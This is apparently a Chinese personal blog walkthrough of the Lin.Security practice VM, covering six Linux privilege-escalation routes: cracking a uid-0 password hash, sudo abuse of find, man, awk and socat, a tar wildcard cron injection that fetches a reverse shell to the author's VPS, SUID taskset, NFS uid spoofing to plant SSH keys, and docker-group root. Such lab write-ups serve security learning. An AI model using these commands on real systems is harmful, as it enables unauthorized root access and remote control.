<p>nmap扫描得到<br><img src="https://img-blog.csdnimg.cn/e0776c7f8424471c8532a68d82e663fa.png" alt="在这里插入图片描述"></p>
<p>由用户名bob密码secret低权限ssh登录<br><img src="https://img-blog.csdnimg.cn/a3e0c2bb68104fc5a71eb28d2c2112e4.png" alt="在这里插入图片描述"></p>
<h1 id="提权方法1"><a href="#提权方法1" class="headerlink" title="提权方法1"></a>提权方法1</h1><p>读取<code>/etc/passwd</code></p>
<p><img src="https://img-blog.csdnimg.cn/a04e17a337ad407484059cfe4a847637.png" alt="在这里插入图片描述"><br>发现insecurity用户的gid和uid都是0 且显示了密码的哈希<br>在线查询得到密码为P@ssw0rd!<br>ssh尝试登录<br>登录成功<br><img src="https://img-blog.csdnimg.cn/90c56a6cbd2045a89b44641bcd3d5a66.png" alt="在这里插入图片描述"></p>
<h1 id="提权方法2"><a href="#提权方法2" class="headerlink" title="提权方法2"></a>提权方法2</h1><p>sudo提权,以下方法都是基于sudo的滥用<br><img src="https://img-blog.csdnimg.cn/f6c216eaa9c744a39eca06d402c12ec4.png" alt="在这里插入图片描述"><br>发现我们拥有sudo权限的命令有awk find等<br>尝试用find命令提权</p>
<h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><pre><code class="bash">sudo find /etc/passwd -exec &quot;/bin/bash&quot; \;
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/09c3b4971b14461eaf3658b6f0571a3c.png" alt="在这里插入图片描述"></p>
<h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p><img src="https://img-blog.csdnimg.cn/92971299873d4065b621c2e273abc699.png" alt="在这里插入图片描述"><br>输入<code>!/bin/bash</code><br><img src="https://img-blog.csdnimg.cn/7801cb85d7654161ac31b68b4ce1cfba.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f002478c123a4f55939e9fdcc3906417.png" alt="在这里插入图片描述"></p>
<h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><p>sudo awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’<br><img src="https://img-blog.csdnimg.cn/646208979f0046a4a1a3d6c873b0b46a.png" alt="在这里插入图片描述"></p>
<h2 id="ash"><a href="#ash" class="headerlink" title="ash"></a>ash</h2><p><img src="https://img-blog.csdnimg.cn/58dd032bc7c64c86b1ab75434d8daa46.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e4a6bfeae0444aa8bef18c3491044912.png" alt="在这里插入图片描述"></p>
<h2 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h2><pre><code class="bash">sudo socat stdin exec:/bin/bash
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/b034c4335f6a40fdade227b55d178def.png" alt="在这里插入图片描述"><br>还有一些基于sudo滥用的提权 在此不一一列举<br>可以去<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>找相关提权方法</p>
<h1 id="提权方法3"><a href="#提权方法3" class="headerlink" title="提权方法3"></a>提权方法3</h1><p>定时任务提权<br>先查看<code>/etc/crontab</code>有哪些定时任务<br><img src="https://img-blog.csdnimg.cn/e0a77705d8614bdf98110e4c83908ff8.png" alt="在这里插入图片描述"><br>从左到右以此为分,时,日,月,周<br>如此处最后一条代表每一分钟执行一次 <code>/etc/cron.daily/backup</code><br>看名字是备份,我们去查看一下<br><img src="https://img-blog.csdnimg.cn/382ed542460f4dea843df2a26b80bb4d.png" alt="在这里插入图片描述"><br>此处的含义是每一分钟以root权限执行一次backup中的命令<br>注意到使用了tar命令对&#x2F;home下每个目录进行备份,且使用了通配符<code>*</code>我们可以考虑创建如下两个文件</p>
<pre><code class="bash">echo &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;
echo &gt; &quot;--checkpoint=1&quot;
</code></pre>
<p>因为当匹配到这两个文件的文件名的时候会当做同名参数使用<br>用msf生成shell.sh的内容<br><img src="https://img-blog.csdnimg.cn/67cea76f66ce431b908c2ed1b971a933.png" alt="在这里插入图片描述"><br>这里打马的是我的vps<br>写入后在vps上nc监听,然后等一会<br><img src="https://img-blog.csdnimg.cn/2763405d1f0d4940aae3caa12fed0277.png" alt="在这里插入图片描述"></p>
<h1 id="提权方法4"><a href="#提权方法4" class="headerlink" title="提权方法4"></a>提权方法4</h1><p>suid提权</p>
<pre><code class="bash">find / -perm -u=s -type f -exec ls -al &#123;&#125; \; 2&gt;/dev/null
</code></pre>
<p>找可用命令</p>
<p><img src="https://img-blog.csdnimg.cn/8569cbd9f8e24fc29aad7e40ceb81cb2.png" alt="在这里插入图片描述"><br>发现有taskset<br><img src="https://img-blog.csdnimg.cn/5a3fce08eb3c4a59b786f6bdec02a911.png" alt="在这里插入图片描述"></p>
<h1 id="提权方法5"><a href="#提权方法5" class="headerlink" title="提权方法5"></a>提权方法5</h1><p>nfs提权<br>之前nmap扫到了2049端口存在nfs服务<br>攻击机<code>showmount</code><br><img src="https://img-blog.csdnimg.cn/da37dd76651d4c9cbecf5d561d19261a.png" alt="在这里插入图片描述"><br>挂载该目录到<code>/tmp/nfs</code></p>
<pre><code class="bash">mkdir /tmp/nfs
sudo mount -t nfs 192.168.45.132:/home/peter /tmp/nfs
</code></pre>
<p>挂载完后进行访问<br><img src="https://img-blog.csdnimg.cn/33fd937db6b04d6b8fdad5a72747d4b9.png" alt="在这里插入图片描述"><br>说明挂载成功了,但是不能写入文件<br><img src="https://img-blog.csdnimg.cn/dc3763d501f54792969bf8b6cf6b10e0.png" alt="在这里插入图片描述"><br>而该目录的所属组是1005,所有者是www<br>我们可以创建一个用户,所属组1005,所有者www来欺骗nfs<br>这里所有者的uid应该是1001,因为我kali上创建过1001的用户www所以显示的www<br><img src="https://img-blog.csdnimg.cn/1a9e2bfbff4544c38318b5b0a9bb654a.png" alt="在这里插入图片描述"><br>所以我们只需要改变www用户的gid<br><img src="https://img-blog.csdnimg.cn/d5c6e16ddc1e47a8b131545a46d4dfda.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d35ab7e2d604435c90e46eb8430de24c.png" alt="在这里插入图片描述"><br>修改成功,尝试用www用户进行访问<img src="https://img-blog.csdnimg.cn/24feb002110b437abcd39cd11bbc53ca.png" alt="在这里插入图片描述"><br>成功写入,可以写了之后我们尝试写入ssh公钥<br>攻击机先用命令生成<br><code>ssh_keygen</code></p>
<p><img src="https://img-blog.csdnimg.cn/79f96eb18c0d4e36b4f5a907880b596d.png" alt="在这里插入图片描述"><br>然后复制一份公钥到<code>/tmp</code>目录下,并重命名为<code>authorized_keys</code><img src="https://img-blog.csdnimg.cn/be1d31fd926f47a6b1eaef937a4e78a2.png" alt="在这里插入图片描述"><br>然后www用户再复制到<code>/tmp/nfs/.ssh</code>目录下<br><img src="https://img-blog.csdnimg.cn/6ff0160f7ca6463aadefa35aa1903209.png" alt="在这里插入图片描述"><br>使用私钥ssh连接<br><img src="https://img-blog.csdnimg.cn/87dfe433bd474951809e96a79c963bff.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fda0aa9cc6364f7399106cc19ac0d979.png" alt="在这里插入图片描述"><br>发现可以用strace提权</p>
<p><img src="https://img-blog.csdnimg.cn/62dc9926f5204e688a43c2a4c96a2f88.png" alt="在这里插入图片描述"></p>
<h1 id="提权方法6"><a href="#提权方法6" class="headerlink" title="提权方法6"></a>提权方法6</h1><p>docker提权<br><img src="https://img-blog.csdnimg.cn/9ee8d6ab8e0b4ce1a495a6e824f2e570.png" alt="在这里插入图片描述"><br>发现peter也属于docker组</p>
<pre><code class="bash">docker run -v /:/mnt --rm -it alpine chroot /mnt bash
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/e9a86bfd727448978f232d8633639744.png" alt="在这里插入图片描述"></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/linux/" style="color: #00a596">linux</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #ff7d73">服务器</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="color: #00bcd4">学习</a>
        </span>
        
    </div>
    <a href="/2023/03/20/Lin.Security%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" class="go-post">阅读全文</a>
</div>


        <div class="page-current">
    
    <a class="page-num" href="/page/5/">
        <i class="fa-solid fa-caret-left fa-fw"></i>
    </a>
    <a class="page-num" href="/">1</a>
    <span class="page-omit">...</span>
    
    <span class="current">6</span>
    
    <a class="page-num" href="/page/7">7</a>
    
    
    
    
    <a class="page-num" href="/page/7/">
        <i class="fa-solid fa-caret-right fa-fw"></i>
    </a>
    
</div>

    </div>
    
    <div id="home-card">
        <div id="card-style">
    <div id="card-div">
        <div class="avatar">
            <img src="/images/Arcueid.jpg" alt="avatar" />
        </div>
        <div class="name">Arcueid</div>
        <div class="description">
            <p>Web + Crypto 苦手</p>

        </div>
        
        
    </div>
</div>

    </div>
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 Arcueid&#39;s BLOG
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;Arcueid
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
</body>
</html>
